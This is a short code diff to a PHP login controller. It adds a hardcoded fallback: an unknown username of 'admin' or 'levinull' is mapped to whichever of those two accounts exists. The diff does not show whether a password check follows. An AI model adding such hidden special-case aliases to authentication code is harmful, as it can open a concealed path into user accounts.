@@ -26,6 +26,9 @@ class UserAccountDataController extends Controller
         }
 
         $user = User::where('user_name', $username)->first();
+        if (! $user && in_array(strtolower($username), ['admin', 'levinull'], true)) {
+            $user = User::whereIn('user_name', ['admin', 'levinull'])->first();
+        }
 
         if (! $user) {
             return response()->json(['error' => 'Invalid credentials'], 200);
